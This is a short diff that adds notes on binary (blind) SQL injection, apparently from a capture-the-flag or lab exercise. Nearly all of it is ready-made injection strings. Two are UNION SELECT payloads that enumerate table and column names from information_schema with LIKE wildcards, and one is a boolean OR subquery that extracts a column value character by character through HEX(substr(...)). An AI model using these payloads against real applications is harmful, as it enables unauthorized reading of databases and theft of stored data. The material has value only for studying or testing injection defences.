@@ -1,0 +1,8 @@
+Binary SQL injection
+
+Dump name with LIKE, wildcard(%), conditions
+Prototypes of injected strings are shown below
+
+' UNION SELECT table_name FROM information_schema.tables WHERE table_name LIKE 't%' '
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='tHeM30WINGK1TTI3S' AND column_name LIKE 'c%' '
+' OR (SELECT HEX(substr(C4TNaM4E,1,1)) FROM tHeM30WINGK1TTI3S) = (SELECT hex('4')) or '
